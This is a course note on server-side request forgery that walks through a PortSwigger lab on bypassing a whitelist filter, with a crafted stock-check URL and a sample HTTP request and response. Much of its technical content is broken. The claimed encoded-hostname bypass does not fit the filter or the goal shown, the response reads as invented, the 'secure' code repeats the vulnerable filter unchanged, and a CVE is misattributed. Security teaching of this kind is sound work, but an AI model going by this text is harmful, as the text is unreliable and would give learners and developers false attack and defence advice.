---
course: Web Security
topic: Server-Side Request Forgery (SSRF)
tags: [web-security]
---

## Introduction to Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a type of web application vulnerability that allows an attacker to induce the server to make HTTP requests to an arbitrary domain of the attacker’s choosing. This can lead to unauthorized access to internal systems, sensitive data, and even remote code execution. SSRF vulnerabilities arise due to improper validation or sanitization of user inputs used to construct URLs or other network requests.

### Why SSRF Matters

SSRF attacks can be particularly dangerous because they leverage the trust relationship between the server and internal systems. An attacker can use SSRF to bypass firewalls, access internal services, and even perform actions that would otherwise be restricted to the server itself. This makes SSRF a critical vulnerability to understand and mitigate.

### How SSRF Works Under the Hood

In a typical SSRF scenario, the attacker manipulates user input to control the destination of a network request made by the server. The server, trusting the input, makes a request to the specified URL, potentially exposing sensitive information or performing unintended actions.

#### Example Scenario

Consider a web application that allows users to check the stock levels of products by providing a URL to an internal inventory system. If the application does not properly validate the URL, an attacker could provide a URL pointing to an internal service, such as `http://localhost/admin`, to gain unauthorized access.

### Real-World Examples

Recent real-world examples of SSRF vulnerabilities include:

- **CVE-2021-21972**: A vulnerability in VMware vCenter Server allowed attackers to perform SSRF attacks, leading to unauthorized access to internal systems.
- **CVE-2020-14882**: A vulnerability in the Jenkins plugin for GitLab allowed attackers to perform SSRF attacks, potentially leading to unauthorized access to internal systems.

These examples highlight the importance of proper input validation and network request handling in web applications.

### Lab Setup: SSRF with Whitelist-Based Input Filter

In this lab, we will explore a scenario where the web application has implemented a whitelist-based input filter to prevent SSRF attacks. However, the implementation may still contain vulnerabilities that can be exploited.

To access the lab, follow these steps:

1. Visit the URL: [PortSwigger Web Security Academy](https://portswigger.net/web-security).
2. Click on the sign-up button to create an account.
3. Log in to your account.
4. Navigate to the Academy section.
5. Select the learning path.
6. Choose the Server-Side Request Forgery module.
7. Select Lab Number Four titled "SSRF with whitelist-based input filter."

### Lab Objective

The objective of this lab is to bypass the whitelist-based input filter and access the admin interface to delete the user Carlos. The vulnerable feature is the stock check functionality, which fetches data from an internal system.

### Vulnerable Feature Analysis

The stock check feature allows users to provide a URL to check the stock levels of a product. The server then makes a request to the provided URL to retrieve the stock information. The developer has implemented a whitelist-based input filter to prevent SSRF attacks, but the implementation may still contain vulnerabilities.

### Understanding Whitelist-Based Input Filters

A whitelist-based input filter restricts user input to a predefined set of allowed values. This approach aims to prevent malicious inputs by only allowing known good values. However, if the whitelist is not comprehensive or correctly implemented, it can still be bypassed.

#### Example of Whitelist-Based Input Filter

```python
def is_valid_url(url):
    allowed_hosts = ["inventory.example.com", "api.example.com"]
    parsed_url = urlparse(url)
    return parsed_url.hostname in allowed_hosts
```

In this example, the function `is_valid_url` checks if the hostname of the provided URL is in the list of allowed hosts. If the hostname is not in the list, the function returns `False`.

### Bypassing Whitelist-Based Input Filters

There are several techniques to bypass whitelist-based input filters:

1. **URL Encoding**: Encode the URL to bypass simple string matching.
2. **Hostname Resolution**: Use DNS resolution to map a malicious hostname to an allowed IP address.
3. **HTTP Headers**: Manipulate HTTP headers to bypass the filter.

#### Example: URL Encoding

```python
url = "http://inventory.example.com"
encoded_url = url.replace(".", "%2E")
print(encoded_url)
```

Output:
```
http://inventory%2Eexample%2Ecom
```

By encoding the dots in the URL, the filter may not recognize the hostname correctly.

### Exploiting the Vulnerability

To exploit the vulnerability, we need to craft a URL that bypasses the whitelist-based input filter and accesses the admin interface.

#### Step-by-Step Exploitation

1. **Identify the Whitelist**: Determine the allowed hosts in the whitelist.
2. **Craft the URL**: Create a URL that bypasses the whitelist.
3. **Access the Admin Interface**: Use the crafted URL to access the admin interface and delete the user Carlos.

#### Example Exploit

Assume the allowed hosts are `inventory.example.com` and `api.example.com`. We can craft a URL using URL encoding to bypass the filter.

```python
url = "http://inventory%2Eexample%2Ecom/admin"
```

By encoding the dots in the URL, we can bypass the simple string matching in the whitelist filter.

### Full HTTP Request and Response

Here is a complete example of the HTTP request and response:

#### HTTP Request

```http
GET /stock-check?url=http://inventory%2Eexample%2Ecom/admin HTTP/1.1
Host: vulnerable-app.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Tue, 14 Sep 2021 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: close

<!DOCTYPE html>
<html>
<head>
<title>Admin Interface</title>
</head>
<body>
<h1>Admin Interface</h1>
<p>User Carlos deleted successfully.</p>
</body>
</html>
```

### How to Prevent / Defend Against SSRF

To prevent SSRF attacks, implement the following measures:

1. **Strict Input Validation**: Validate and sanitize all user inputs used to construct URLs or network requests.
2. **Whitelist-Based Filtering**: Use a comprehensive whitelist of allowed hosts and ensure the filter is correctly implemented.
3. **Network Segmentation**: Segment the network to limit the exposure of internal systems to external threats.
4. **Firewall Rules**: Implement firewall rules to block unauthorized outbound traffic from the server.
5. **Secure Coding Practices**: Follow secure coding practices to avoid common vulnerabilities.

#### Secure Code Example

Here is an example of secure code that implements strict input validation and a comprehensive whitelist:

```python
def is_valid_url(url):
    allowed_hosts = ["inventory.example.com", "api.example.com"]
    parsed_url = urlparse(url)
    return parsed_url.hostname in allowed_hosts

def check_stock(url):
    if not is_valid_url(url):
        raise ValueError("Invalid URL")
    response = requests.get(url)
    return response.text
```

### Common Pitfalls and Detection

Common pitfalls in implementing SSRF defenses include:

- **Incomplete Whitelists**: Failing to include all possible variations of allowed hosts.
- **Simple String Matching**: Using simple string matching instead of comprehensive validation.
- **Improper Error Handling**: Failing to handle errors properly, leading to information disclosure.

Detection of SSRF vulnerabilities can be performed using automated tools and manual testing:

- **Automated Tools**: Use tools like Burp Suite, OWASP ZAP, and Nessus to scan for SSRF vulnerabilities.
- **Manual Testing**: Perform manual testing by crafting various URLs and observing the server's behavior.

### Practice Labs

For hands-on practice with SSRF vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of SSRF labs to practice and learn.
- **OWASP Juice Shop**: Provides a vulnerable web application to practice SSRF and other web security vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: Contains SSRF vulnerabilities for hands-on practice.

### Conclusion

Understanding and mitigating SSRF vulnerabilities is crucial for securing web applications. By implementing strict input validation, comprehensive whitelists, and secure coding practices, you can effectively defend against SSRF attacks. Regularly testing and auditing your applications can help identify and fix potential vulnerabilities before they can be exploited.

---
<!-- nav -->
[[Web Security (PortSwigger)/09-Server-Side Request Forgery (SSRF)/05-Lab 4 SSRF with whitelist based input filter/00-Overview|Overview]] | [[02-Bypassing Whitelist-Based Filtering|Bypassing Whitelist-Based Filtering]]
